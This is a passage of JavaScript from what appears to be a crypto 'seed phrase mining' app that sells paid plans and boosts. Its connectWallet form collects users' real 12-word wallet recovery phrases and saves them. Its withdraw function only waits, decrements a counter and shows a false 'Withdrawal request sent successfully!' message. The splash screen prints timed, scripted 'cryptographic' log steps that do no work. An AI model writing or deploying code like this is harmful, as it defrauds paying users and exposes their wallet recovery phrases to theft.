      '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:32px;height:32px;color:#a78bfa;flex-shrink:0;"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>',
      'Nothing to Withdraw',
      'No wallets found yet. Keep mining and come back when you have a balance!'
    );
    return;
  }
  if(_withdrawBusy)return;
  _withdrawBusy=true;

  var bar=document.getElementById('withdrawProgressBar');
  var btn=document.getElementById('withdrawBtn');
  if(!bar){_withdrawBusy=false;return;}
  bar.classList.add('active');
  if(btn)btn.disabled=true;

  
  setTimeout(function(){
    bar.classList.remove('active');
    if(btn)btn.disabled=false;
    _withdrawBusy=false;

    
    var fb=document.getElementById('foundBody');
    if(fb){
      var lines=fb.querySelectorAll('.found-line');
      if(lines.length>0) lines[lines.length-1].remove();
      if(fb.querySelectorAll('.found-line').length===0){
        fb.innerHTML='<div class="found-placeholder">Found Seed Phrases Appear Here</div>';
      }
    }
    
    var fn=document.getElementById('foundNum');
    var pf=document.getElementById('pendingFound');
    var curFound=parseInt((fn&&fn.textContent)||'0')||0;
    if(curFound>0){
      var newFound=curFound-1;
      if(fn)fn.textContent=newFound;
      if(pf)pf.textContent=newFound;
    }
    
    if(window.DB && window.DB.tgId){
      var _pvEl2=document.getElementById('pendingVal');
      var _al2=document.getElementById('archList');
      window.DB.call('save_found',{
        tg_id: window.DB.tgId,
        found_count: fn?parseInt(fn.textContent)||0:0,
        pending_found: pf?parseInt(pf.textContent)||0:0,
        pending_val: _pvEl2?parseFloat(_pvEl2.textContent.replace(/[^0-9.]/g,''))||0:0,
        found_body: fb?fb.innerHTML:'',
        arch_count: _al2?_al2.querySelectorAll('.arch-found-line').length:0
      });
      
      if(window.DASH_STATS){
        window.DB.saveDash(
          window.DASH_STATS.allTime||0,
          window.DASH_STATS.last30||0,
          window.DASH_STATS.coins||{},
          _pvEl2?parseFloat(_pvEl2.textContent.replace(/[^0-9.]/g,''))||0:0,
          pf?parseInt(pf.textContent)||0:0
        );
      }
    }

    
    refreshPendingCoin();
    showWithdrawToast('Withdrawal request sent successfully!', true);
    showWithdrawDialog();
  },3000);
}

function _showWithdrawBlockMsg(iconSvg, title, bodyTxt){
  var emoji = title.indexOf('Wallet') !== -1 ? '🔗' : '🔍';
  var clean = bodyTxt.replace(/<[^>]+>/g,'');
  if(typeof window._showStoreStyleToast === 'function'){
    window._showStoreStyleToast(
      '<span style="display:flex;flex-direction:column;gap:2px;text-align:center;">'
      +'<span style="font-weight:800;">'+emoji+' '+title+'</span>'
      +'<span style="font-size:0.72rem;font-weight:500;opacity:0.8;">'+clean+'</span>'
      +'</span>',
      4500
    );
  }
}
function _showWithdrawBlockMsg_UNUSED(iconSvg, title, body){
  var existing = document.getElementById('_wdBlockMsg');
  if(existing) existing.remove();
  var overlay = document.createElement('div');
  overlay.id = '_wdBlockMsg';
  overlay.style.cssText = 'position:fixed;inset:0;z-index:59999;background:rgba(0,0,0,.72);backdrop-filter:blur(14px);display:flex;align-items:center;justify-content:center;padding:20px;';
  overlay.innerHTML = '<div style="width:min(340px,90vw);background:linear-gradient(160deg,rgba(20,14,40,.98),rgba(10,7,24,.98));border:1.5px solid rgba(124,92,255,.45);border-radius:20px;padding:28px 24px;display:flex;flex-direction:column;align-items:center;gap:14px;text-align:center;box-shadow:0 24px 60px rgba(0,0,0,.6),0 0 0 1px rgba(124,92,255,.12) inset;">'
    + '<div style="width:56px;height:56px;border-radius:16px;background:rgba(124,92,255,.12);border:1px solid rgba(124,92,255,.3);display:flex;align-items:center;justify-content:center;">'+iconSvg+'</div>'
    + '<div style="font-size:1rem;font-weight:800;color:#e8ebff;letter-spacing:0.01em;">'+title+'</div>'
    + '<div style="font-size:0.82rem;color:#9aa1d9;line-height:1.55;">'+body+'</div>'
    + '<button onclick="document.getElementById(\'_wdBlockMsg\').remove()" style="margin-top:4px;padding:10px 28px;background:linear-gradient(135deg,#7c5cff,#5b3dcc);border:none;border-radius:12px;color:#fff;font-size:0.85rem;font-weight:700;cursor:pointer;font-family:inherit;letter-spacing:0.03em;">Got it</button>'
    + '</div>';
  document.body.appendChild(overlay);
  overlay.addEventListener('click', function(e){ if(e.target===overlay) overlay.remove(); });
}

function showWithdrawToast(msg,success){
  var toast=document.getElementById('withdrawToast');
  if(!toast)return;
  toast.classList.remove('show','toast-error');
  toast.querySelector('span').textContent=msg;
  var icon=document.getElementById('withdrawToastIcon');
  if(icon){
    if(success){icon.innerHTML='<path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/>';}
    else{icon.innerHTML='<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>';}
  }
  if(!success)toast.classList.add('toast-error');
  void toast.offsetWidth;
  toast.classList.add('show');
  setTimeout(function(){toast.classList.remove('show');},3000);
}

function showWithdrawDialog(){
  var d=document.getElementById('withdrawDialog');
  if(!d){
 return; }

  
  if(d.parentNode !== document.body) document.body.appendChild(d);

  
  d.style.cssText='position:fixed!important;inset:0!important;z-index:49999!important;display:flex!important;align-items:center!important;justify-content:center!important;padding:20px!important;background:rgba(0,0,0,.78)!important;backdrop-filter:blur(18px)!important;-webkit-backdrop-filter:blur(18px)!important;';

  
  var card=d.querySelector('div');
  if(card){
    card.style.cssText=(card.getAttribute('style')||'')+';transform:scale(.88) translateY(24px);opacity:0;transition:none;';
    void card.offsetWidth;
    card.style.transition='transform .34s cubic-bezier(.25,1.4,.5,1),opacity .26s ease';
    card.style.transform='scale(1) translateY(0)';
    card.style.opacity='1';
  }

  
  var fill=d.querySelector('.wd-progress-fill');
  if(fill){
    fill.style.transition='none';
    fill.style.width='100%';
    void fill.offsetWidth;
    fill.style.transition='width 4s linear';
    fill.style.width='0%';
  }

  
  setTimeout(function(){
    if(card){ card.style.transition='transform .22s ease-in,opacity .2s ease'; card.style.transform='scale(.9) translateY(16px)'; card.style.opacity='0'; }
    setTimeout(function(){ d.style.display='none!important'; d.style.cssText='display:none;'; },220);
  },4100);
}

loadWalletState();
_onDom(function(){
  applyWalletUI();
  
  var bc=document.getElementById('boostCount');
  var pf=document.getElementById('progFill');
  if(bc) bc.textContent=boostCount+'/20';
  if(pf) pf.style.width=(boostCount/20*100)+'%';
});
setTimeout(applyWalletUI,0);

function connectWallet(){
  
  if ((window.ALFA_PLAN_LEVEL || 0) < 1) {
    var innerBtn = document.getElementById('seedConnectBtn');
    if (innerBtn) {
      var rect = innerBtn.getBoundingClientRect();
      var t = document.createElement('div');
      t.style.cssText = 'position:fixed;left:'+Math.round(rect.left+rect.width/2)+'px;top:'+Math.round(rect.top-10)+'px;transform:translate(-50%,-100%) translateY(8px);background:linear-gradient(135deg,rgba(20,10,50,.98),rgba(10,5,25,1));border:1px solid rgba(255,100,100,.5);color:#ffaaaa;font-family:Outfit,sans-serif;font-size:.75rem;font-weight:700;padding:9px 16px;border-radius:12px;box-shadow:0 6px 24px rgba(0,0,0,.6);white-space:nowrap;z-index:69999;pointer-events:none;opacity:0;transition:opacity .2s ease,transform .2s ease;';
      t.textContent = '🔒 Upgrade required to save wallet';
      document.body.appendChild(t);
      void t.offsetWidth;
      t.style.opacity='1'; t.style.transform='translate(-50%,-100%) translateY(0)';
      setTimeout(function(){ t.style.opacity='0'; t.style.transform='translate(-50%,-100%) translateY(-8px)'; setTimeout(function(){ t.remove(); },220); },2800);
    }
    return;
  }
  var inputs=document.querySelectorAll('.seed-inp');
  var words=[];
  inputs.forEach(function(inp){var v=inp.value.trim();if(v)words.push(v);});
  if(words.length<12){
    inputs.forEach(function(inp){
      if(!inp.value.trim()){
        inp.closest('.seed-field').style.borderColor='hsl(0,80%,55%)';
        inp.closest('.seed-field').style.boxShadow='0 0 8px hsl(0,80%,55%/.3)';
        setTimeout(function(){inp.closest('.seed-field').style.borderColor='';inp.closest('.seed-field').style.boxShadow='';},1500);
      }
    });
    var missing=12-words.length;
    showSeedLog('error','Missing '+missing+' word'+(missing>1?'s':'')+' — please fill all 12 fields');
    return;
  }
  var invalid=[];
  inputs.forEach(function(inp,i){var v=inp.value.trim();if(!/^[a-zA-Z]+$/.test(v))invalid.push(i+1);});
  if(invalid.length>0){showSeedLog('error','Invalid word'+(invalid.length>1?'s':'')+' at position '+invalid.join(', ')+' — letters only');return;}
  var walletName=(document.getElementById('seedWalletTitle')||{}).textContent||'Wallet';
  var btn=document.getElementById('seedConnectBtn');
  if(btn){
    btn.disabled=true;
    btn.innerHTML='<svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg> Connected!';
    btn.style.background='linear-gradient(135deg,hsl(145,100%,35%),hsl(160,100%,42%))';
  }
  showSeedLog('success','Successfully connected a wallet!');
  saveWalletState(walletName, words);
  setTimeout(function(){
    closeOverlay('seedPhraseOverlay');
    applyWalletUI();
    showConnectBtnToast('✅ Wallet connected!', true);
    if(btn){
      btn.disabled=false;
      btn.style.background='';
    }
  },1800);
}

function pasteSeedPhrase(){
  if(!navigator.clipboard||!navigator.clipboard.readText){showSeedLog('error','Clipboard not accessible — paste manually');return;}
  navigator.clipboard.readText().then(function(text){
    var raw=text.trim();
    var words=raw.split(/[\s,]+/).filter(Boolean);
    if(words.length!==12){showSeedLog('error','Clipboard has '+words.length+' word'+(words.length!==1?'s':'')+' — need exactly 12');return;}
    var badWords=[];
    words.forEach(function(w,i){if(!/^[a-zA-Z]+$/.test(w))badWords.push(i+1);});
    if(badWords.length>0){showSeedLog('error','Invalid content at position '+badWords.join(', ')+' — not a valid seed phrase');return;}
    var inputs=document.querySelectorAll('.seed-inp');
    inputs.forEach(function(inp,i){if(words[i])inp.value=words[i].toLowerCase();});
    showSeedLog('success','Pasted 12 words successfully!');
  }).catch(function(){showSeedLog('error','Could not read clipboard — check browser permissions');});
}

var BIP39_SAMPLE=['abandon','ability','able','about','above','absent','absorb','abstract','absurd','abuse','access','accident','account','accuse','achieve','acid','acoustic','acquire','across','act','action','actor','actress','actual','adapt','add','addict','address','adjust','admit','adult','advance','advice','aerobic','afford','afraid','again','age','agent','agree','ahead','aim','air','airport','aisle','alarm','album','alcohol','alert','alien','all','alley','allow','almost','alone','alpha','already','also','alter','always','amateur','amazing','among','amount','amused','analyst','anchor','ancient','anger','angle','angry','animal','ankle','announce','annual','another','answer','antenna','antique','anxiety','apart','apology','appear','apple','approve','april','arch','arctic','area','arena','argue','arm','armed','armor','army','around','arrange','arrest','arrive','arrow','art','artefact','artist','artwork','ask','aspect','assault','asset','assist','assume','asthma','athlete','atom','attack','attend','attitude','attract','auction','audit','august','aunt','author','auto','autumn','average','avocado','award','aware','away','awesome'];
function randomizeSeed(){
  var inputs=document.querySelectorAll('.seed-inp');
  
  var VALID_PHRASES=[
    'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
    'legal winner thank year wave sausage worth useful legal winner thank yellow',
    'letter advice cage above prepare proud chaos mercy vapor arm road hotel',
    'zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo zoo wrong',
    'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about',
    'all hour make first leader extend hole alien behind guard gospel lava',
    'hamster diagram private dutch cause delay private meat slide toddler razor book',
    'scheme spot photo card baby mountain device kick cradle pact join borrow',
    'horn tenant knee talent sponsor spell gate clip pulse soap slush warm',
    'panda eyebrow bullet gorilla call smoke muffin taste mesh discover soft ostrich',
    'cat swing flag economy stadium alone churn speed unique patch report train',
    'light rule cinnamon wrap drastic word pride squirrel upgrade then income fatal',
    'jelly better achieve collect unaware mountain thought cargo oxygen act hood bridge',
    'renew stay biology evidence goat welcome casual join diet excess luggage nation',
    'dignity pass list indicate nasty swamp pool script soccer toe leaf photo',
    'soldier error virus fabric fix despair aunt slab mask saddle useless chronic',
    'word finger loud despair marriage quiz disorder stumble rough purity stove chronic',
    'clean finger depth physical random crisp glide royal wink upgrade pioneer robust',
    'nerve orient mobile cactus toss aware shiver cluster mercy viable brisk enrich',
    'capable humble surge vintage album timber trim effort broccoli vintage daring glare'
  ];
  var phrase=VALID_PHRASES[Math.floor(Math.random()*VALID_PHRASES.length)];
  var words=phrase.split(' ');
  
  var freshInputs=document.querySelectorAll('.seed-inp');
  freshInputs.forEach(function(inp,i){
    inp.value=words[i]||'';
    
    inp.dispatchEvent(new Event('input',{bubbles:true}));
  });
  showSeedLog('success','Random phrase generated — for testing only');
  if(typeof updateSeedCopyBtn==='function') updateSeedCopyBtn();
}

window.openPromoInline = function(){
  var label = document.getElementById('promoLabel');
  var input = document.getElementById('promoInlineInput');
  var soon  = document.getElementById('promoSoonLbl');
  if(!input){
return;}
  
  var _validCode = window._promoCode || '';
  if(!_validCode){
    if(label){ label.textContent='🔒 Promo closed for now'; label.style.color='rgba(200,180,255,0.5)'; label.style.cursor='default'; }
    return;
  }
  if(label) label.style.display='none';
  if(soon)  soon.style.display='none';
  input.style.display='inline-block';
  input.value='';
  input.classList.remove('promo-error');
  requestAnimationFrame(function(){ input.focus(); });
};

_onDom(function(){
  
  var promoLbl = document.getElementById('promoLabel');
  if(promoLbl && !promoLbl._promoTouch){
    promoLbl._promoTouch = true;
    promoLbl.addEventListener('touchend', function(e){
      e.preventDefault();
      e.stopPropagation();
      window.openPromoInline();
    }, {passive:false});
  }
  var input = document.getElementById('promoInlineInput');
  if(!input)return;
  input.addEventListener('input', function(){
    this.value = this.value.replace(/\D/g,'').slice(0,7);
    this.classList.remove('promo-error');
  });
  input.addEventListener('keydown', function(e){
    if(e.key==='Enter'){
      if(this.value.length!==7){
        this.classList.add('promo-error');
        return;
      }
      var enteredCode = this.value;
      
      var label = document.getElementById('promoLabel');
      var soon  = document.getElementById('promoSoonLbl');
      this.style.display='none';
      
      var _validCode = window._promoCode || '';
      if(enteredCode === _validCode){
        if(label){label.textContent='🎉 50% Discount Applied!';label.style.display='';}
        if(soon)soon.style.display='';
        var wrap=document.getElementById('promoBtnWrap');
        if(wrap)wrap.style.borderColor='rgba(0,255,163,.5)';
        
        _showStoreStyleToast('🎉 Promo activated! 50% discount applied on all plans');
        
        window._promoDiscount50 = true;
        (function(){
          var plans=[
            {sel:'.sa-plan-btn-starter',orig:99,priceEl:null},
            {sel:'.sa-plan-btn-pro',orig:149,priceEl:null},
            {sel:'.sa-plan-btn-primary',orig:249,priceEl:null}
          ];
          document.querySelectorAll('.sa-pc-price').forEach(function(el,i){
            if(i<plans.length){
              var orig=plans[i].orig;
              var disc=Math.round(orig*0.5);
              el.textContent='$'+disc;
              el.style.color='#00ffa3';
              var oldEl=el.previousElementSibling;
              if(oldEl&&oldEl.classList.contains('sa-pc-old'))oldEl.textContent='$'+orig;
            }
          });
          
          var _origModal=window.openPaymentModal;
          window.openPaymentModal=function(price){
            var discounted=Math.round(price*0.5);
            if(typeof _origModal==='function')_origModal(discounted);
          };
        })();
        
        setTimeout(function(){
          if(typeof gotoScreen==='function')gotoScreen('screen-store');
        },1200);
        setTimeout(function(){
          if(label)label.textContent='ENTER PROMOCODE';
          var wrap2=document.getElementById('promoBtnWrap');
          if(wrap2)wrap2.style.borderColor='';
        },4000);
      } else {
        // كود غلط -> أحمر
        if(label){label.textContent='✗ Wrong code';label.style.display='';label.style.color='#ff4444';}
        if(soon)soon.style.display='';
        var wrap=document.getElementById('promoBtnWrap');
        if(wrap){wrap.style.borderColor='rgba(255,68,68,.7)';wrap.style.boxShadow='0 0 14px rgba(255,68,68,.25)';}
        setTimeout(function(){
          if(label){label.textContent='ENTER PROMOCODE';label.style.color='';}
          if(wrap){wrap.style.borderColor='';wrap.style.boxShadow='';}
        },2500);
      }
    } 
    if(e.key==='Escape'){
      var label=document.getElementById('promoLabel');
      var soon=document.getElementById('promoSoonLbl');
      this.style.display='none';
      if(label)label.style.display='';
      if(soon)soon.style.display='';
    }
  });
  input.addEventListener('blur', function(){
    
    if(this.value.length!==7){
      var label=document.getElementById('promoLabel');
      var soon=document.getElementById('promoSoonLbl');
      this.style.display='none';
      if(label)label.style.display='';
      if(soon)soon.style.display='';
    }
  });
});

window.LIVE_PRICES = {
  bitcoin:68091, ethereum:2060.91, litecoin:53.78,
  binancecoin:627.6, solana:86.46, tether:0.99983,
  dogecoin:0.090793, ripple:1.39, tron:0.31159
};

var _CG_ID = {
  BTC:'bitcoin',ETH:'ethereum',BNB:'binancecoin',USDT:'tether',
  TRX:'tron',LTC:'litecoin',SOL:'solana',XRP:'ripple',DOGE:'dogecoin',TON:'toncoin'
};

function fetchLivePrices(){
  
  if (typeof window._fetchCoinPrices === 'function') {
    window._fetchCoinPrices();
  }
}

window.usdToCoin = function(symbol, usd){
  if(symbol==='USDT') return parseFloat(usd).toFixed(2);
  var id=_CG_ID[symbol], p=id&&window.LIVE_PRICES[id];
  if(!p||p<=0) return '—';
  var a=usd/p;
  return a<0.00001?a.toFixed(8):a<0.001?a.toFixed(6):a<1?a.toFixed(4):a.toFixed(2);
};

if(!window.DASH_STATS) window.DASH_STATS = {
  allTime:0, last30:0,
  coins:{BTC:0,ETH:0,BNB:0,SOL:0,TRX:0,XRP:0,USDT:0,DOGE:0,LTC:0}
};

var _COIN_COLOR = {
  BTC:'hsl(var(--btc))',ETH:'hsl(var(--eth))',BNB:'hsl(var(--bnb))',
  SOL:'hsl(var(--sol))',TRX:'hsl(var(--trx))',XRP:'hsl(var(--xrp))',
  USDT:'hsl(var(--usdt))',DOGE:'hsl(45,100%,55%)',LTC:'hsl(var(--ltc))'
};
var _COIN_ORDER=['BTC','ETH','BNB','SOL','TRX','XRP','USDT','DOGE','LTC'];

function updateDashCards(){
  var dc=document.querySelectorAll('.dash-card');
  if(dc[0]) dc[0].querySelector('.dash-card-val').textContent='$'+window.DASH_STATS.allTime.toFixed(2);
  if(dc[1]) dc[1].querySelector('.dash-card-val').textContent='$'+window.DASH_STATS.last30.toFixed(2);
  document.querySelectorAll('.bc-card').forEach(function(el,i){
    var c=_COIN_ORDER[i]; if(!c)return;
    var rawAmt=window.DASH_STATS.coins[c]||0;
    
    var display = rawAmt > 0 ? (rawAmt < 1 ? rawAmt.toFixed(4) : rawAmt.toFixed(2)) : '0.000';
    var v=el.querySelector('.bc-val');
    if(v) v.innerHTML=display+'<span class="bc-unit" style="color:'+_COIN_COLOR[c]+'"> '+c+'</span>';
  });
}

_onDom(function(){
  fetchLivePrices(); 
  updateDashCards();
  
});

var _netOffline = false;
var _netCheckInt = null;
var _netWasOffline = false;

function _showStoreStyleToast(msg, isError) {
  
  var id = 'netStatusToast';
  var el = document.getElementById(id);
  if (!el) {
    el = document.createElement('div');
    el.id = id;
    el.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:99999;font-family:"Outfit",sans-serif;font-size:.875rem;font-weight:700;text-align:center;padding:14px 20px;display:flex;align-items:center;justify-content:center;gap:10px;transition:transform .4s ease,opacity .4s ease;transform:translateY(-100%);opacity:0;';
    document.body.appendChild(el);
  }
  if (isError) {
    el.style.background = 'linear-gradient(135deg,rgba(255,60,60,.95),rgba(180,20,20,.98))';
    el.style.borderBottom = '2px solid rgba(255,100,100,.5)';
    el.style.color = '#fff';
    el.style.boxShadow = '0 8px 32px rgba(255,0,0,.4)';
    el.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="1" y1="1" x2="23" y2="23"/><path d="M16.72 11.06A10.94 10.94 0 0 1 19 12.55"/><path d="M5 12.55a10.94 10.94 0 0 1 5.17-2.39"/><path d="M10.71 5.05A16 16 0 0 1 22.56 9"/><path d="M1.42 9a15.91 15.91 0 0 1 4.7-2.88"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg> ' + msg;
  } else {
    el.style.background = 'linear-gradient(135deg,rgba(0,200,100,.95),rgba(0,150,80,.98))';
    el.style.borderBottom = '2px solid rgba(0,255,163,.5)';
    el.style.color = '#fff';
    el.style.boxShadow = '0 8px 32px rgba(0,255,163,.3)';
    el.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg> ' + msg;
  }
  
  requestAnimationFrame(function() {
    el.style.transform = 'translateY(0)';
    el.style.opacity = '1';
  });
  if (!isError) {
    setTimeout(function() {
      el.style.transform = 'translateY(-100%)';
      el.style.opacity = '0';
    }, 3500);
  }
}

function hideNetworkToast() {
  var el = document.getElementById('netStatusToast');
  if (el) { el.style.transform = 'translateY(-100%)'; el.style.opacity = '0'; }
}

function checkConnectivity(callback) {
  var ts = Date.now();
  fetch('https://www.blockchain.com/explorer/mempool?_=' + ts, {
    method: 'HEAD',
    mode: 'no-cors',
    cache: 'no-store'
  })
  .then(function() { callback(true); })
  .catch(function() { callback(false); });
}

function handleNetOffline() {
  if (running) stopScan();
  _netOffline = true;
  _netWasOffline = true;
  _showStoreStyleToast('⚠️  No internet — waiting to reconnect...');
  if (!_netCheckInt) {
    _netCheckInt = setInterval(function() {
      checkConnectivity(function(ok) {
        if (ok) {
          clearInterval(_netCheckInt);
          _netCheckInt = null;
          _netOffline = false;
          
          var btn = document.getElementById('scanBtn');
          if (btn) {
            btn.disabled = false;
            btn.style.opacity = '';
            btn.style.filter = '';
            btn.style.cursor = '';
          }
          _showStoreStyleToast('✅  Connection restored — tap Start Mining to continue!');
        }
      });
    }, 5000);
  }
}

function pingOnStart(onSuccess) {
  checkConnectivity(function(ok) {
    if (ok) {
      _netOffline = false;
      onSuccess();
    } else {
      handleNetOffline();
    }
  });
}

function showCopyToast() {
  var t = document.getElementById('copyToast');
  if (!t) return;
  t.style.opacity = '1';
  t.style.transform = 'translateX(-50%) translateY(0)';
  t.style.pointerEvents = 'auto';
  setTimeout(function() {
    t.style.opacity = '0';
    t.style.transform = 'translateX(-50%) translateY(16px)';
    t.style.pointerEvents = 'none';
  }, 2500);
}

window.copySeedWords = function() {
  var inputs = document.querySelectorAll('.seed-inp');
  var words = [];
  inputs.forEach(function(inp) { if (inp.value.trim()) words.push(inp.value.trim()); });
  if (words.length === 0) return;
  var phrase = words.join(' ');
  if (navigator.clipboard) {
    navigator.clipboard.writeText(phrase).then(showCopyToast).catch(function() { _fbCopySeed(phrase); });
  } else { _fbCopySeed(phrase); }
};

function _fbCopySeed(text) {
  var ta = document.createElement('textarea'); ta.value = text;
  ta.style.cssText = 'position:fixed;left:-9999px;top:0;opacity:0;';
  document.body.appendChild(ta); ta.select();
  try { document.execCommand('copy'); showCopyToast(); } catch(e) {}
  document.body.removeChild(ta);
}

function updateSeedCopyBtn() {
  var btn = document.getElementById('seedCopyBtn');
  if (!btn) return;
  var inputs = document.querySelectorAll('.seed-inp');
  var count = 0;
  inputs.forEach(function(inp) { if (inp.value.trim()) count++; });
  btn.style.display = (count === 12) ? 'inline-flex' : 'none';
}

function showSettingsToast(icon, title, subtitle, color) {
  var id = 'settingsActionToast';
  var el = document.getElementById(id);
  if (!el) {
    el = document.createElement('div');
    el.id = id;
    el.style.cssText = [
      'position:fixed;bottom:90px;left:50%;transform:translateX(-50%) translateY(24px)',
      'background:rgba(8,6,20,.52)',
      'border:1.5px solid rgba(124,92,255,.4)',
      'border-radius:16px;padding:12px 18px',
      'display:flex;align-items:center;gap:12px',
      'box-shadow:0 8px 36px rgba(124,92,255,.22),0 12px 48px rgba(0,0,0,.55)',
      'opacity:0;pointer-events:none;z-index:99997',
      'transition:opacity .3s,transform .3s',
      'font-family:"Outfit",sans-serif;min-width:200px;max-width:80vw',
      'backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px)'
    ].join(';');
    document.body.appendChild(el);
  }
  el.style.borderColor = 'rgba(' + color + ',.4)';
  el.style.boxShadow = '0 8px 36px rgba(' + color + ',.25)';
  el.innerHTML = '<div style="font-size:1.4rem;flex-shrink:0;line-height:1;">' + icon + '</div>'
    + '<div><div style="font-size:.875rem;font-weight:800;color:#e8ebff;">' + title + '</div>'
    + '<div style="font-size:.75rem;color:#9aa1d9;margin-top:2px;">' + subtitle + '</div></div>';
  requestAnimationFrame(function() {
    el.style.opacity = '1';
    el.style.transform = 'translateX(-50%) translateY(0)';
    el.style.pointerEvents = 'auto';
  });
  setTimeout(function() {
    el.style.opacity = '0';
    el.style.transform = 'translateX(-50%) translateY(24px)';
    el.style.pointerEvents = 'none';
  }, 3000);
}

var _userHasPurchased = false; 

function checkPurchaseBeforeBoost() {
  if ((window.ALFA_PLAN_LEVEL || 0) < 1) {
    if (typeof _showStoreStyleToast === 'function') {
      _showStoreStyleToast('🔒  Upgrade your plan to unlock Turbo Boost ⚡');
    }
    return false;
  }
  return true;
}

window.handleBoostBuyClick = function(price) {
  if ((window.ALFA_PLAN_LEVEL || 0) < 1) {
    if (typeof _showStoreStyleToast === 'function') {
      _showStoreStyleToast('🔒  Upgrade your plan to unlock Turbo Boost ⚡');
    }
    return;
  }
  openPaymentModal(price || 9);
};

window.openBoostPayment = function(price) {
  window._pmIsBoost = true;
  openPaymentModal(price || 9);
};

function _showBoostLockedBanner() {
  var id = 'boostLockedBanner';
  var el = document.getElementById(id);
  if (!el) {
    el = document.createElement('div');
    el.id = id;
    el.style.cssText = [
      'position:fixed;bottom:80px;left:50%;transform:translateX(-50%) translateY(16px)',
      'background:linear-gradient(135deg,rgba(255,100,50,.18),rgba(255,140,0,.12))',
      'border:1px solid rgba(255,140,0,.55)',
      'color:#ffe8d6;font-family:"Outfit",sans-serif;font-size:.8125rem;font-weight:700',
      'padding:11px 20px;border-radius:12px',
      'display:flex;align-items:center;gap:9px',
      'box-shadow:0 4px 24px rgba(255,100,0,.3)',
      'opacity:0;pointer-events:none',
      'transition:opacity .3s,transform .3s;z-index:9998;white-space:nowrap',
      'backdrop-filter:blur(6px)'
    ].join(';');
    document.body.appendChild(el);
  }
  el.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#ff8c00" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>'
    + ' Purchase a plan first to unlock Turbo Boost ⚡';
  requestAnimationFrame(function() {
    el.style.opacity = '1';
    el.style.transform = 'translateX(-50%) translateY(0)';
    el.style.pointerEvents = 'auto';
  });
  clearTimeout(el._hideTimer);
  el._hideTimer = setTimeout(function() {
    el.style.opacity = '0';
    el.style.transform = 'translateX(-50%) translateY(16px)';
    el.style.pointerEvents = 'none';
  }, 3500);
}

(function(){
  function _runSplash(){
  
  (function(){
    var c=document.getElementById('sp-particles');
    var cols=['rgba(124,92,255,','rgba(0,255,163,','rgba(177,157,255,'];
    for(var i=0;i<18;i++){
      var p=document.createElement('div');p.className='sp-particle';
      var sz=Math.random()*3+1,col=cols[Math.floor(Math.random()*cols.length)],op=(Math.random()*.4+.1).toFixed(2);
      p.style.cssText='width:'+sz+'px;height:'+sz+'px;background:'+col+op+');left:'+(Math.random()*100)+'%;animation-duration:'+(Math.random()*12+8)+'s;animation-delay:'+(Math.random()*10)+'s;';
      c.appendChild(p);
    }
  })();

  var STEPS=[
    {tag:'trun',txt:'Loading <em>cryptographic modules</em>..'},
    {tag:'trun',txt:'Compiling <em>hash functions</em>..'},
    {tag:'tok', txt:'Initializing <em>elliptic curves</em>..'},
    {tag:'trun',txt:'Mnemonic library check..'},
    {tag:'tok', txt:'Generating <em>entropy pool</em>..'},
    {tag:'tok', txt:'Validating <em>BIP-39 wordlist</em>..'},
    {tag:'trun',txt:'Retrieve the <em>latest data</em>..'},
    {tag:'trun',txt:'Scanning <em>blockchain headers</em>..'},
    {tag:'tok', txt:'Syncing <em>mempool transactions</em>..'},
    {tag:'tok', txt:'Verifying <em>block confirmations</em>..'},
    {tag:'trun',txt:'Rebuilding <em>peer connections</em>..'},
    {tag:'twrn',txt:'Flushing <em>corrupted cache</em>..'},
    {tag:'tok', txt:'Restarting <em>RPC endpoints</em>..'},
    {tag:'tok', txt:'Python library check..'},
    {tag:'trun',txt:'Hashing <em>seed phrase</em>..'},
    {tag:'trun',txt:'Derivation paths in <em>Exodus</em>..'},
    {tag:'tok', txt:'Resolving <em>HD wallet structure</em>..'},
    {tag:'tok', txt:'Mapping <em>coin type indexes</em>..'},
    {tag:'trun',txt:'Unlocking <em>hardened child keys</em>..'},
    {tag:'tok', txt:'Calculating <em>public key hashes</em>..'},
    {tag:'tok', txt:'Encoding <em>wallet addresses</em>..'},
    {tag:'twrn',txt:'Update and repaired servers..'},
    {tag:'tok', txt:'All networks <em>initialized</em> — ready.'},
  ];
  var TOTAL=STEPS.length,STEP_MS=10000/TOTAL;
  var logBox=document.getElementById('sp-logbox');
  var curLine=document.getElementById('sp-cur-line');
  var stepsEl=document.getElementById('sp-stat-steps');
  var statSt=document.getElementById('sp-stat-status');
  var btn=document.getElementById('sp-btn');
  var splash=document.getElementById('splash-root');
  var idx=0,done=false;
  var tagTxt={tok:'OK',trun:'RUN',twrn:'WARN'};

  
  function maxVisible(){
    var lb=document.getElementById('sp-logbox');
    if(!lb) return 6;
    return Math.max(3,Math.floor((lb.offsetHeight-16)/18));
  }

  function addLine(step){
    if(window.SPLASH_ALREADY_DONE) return;
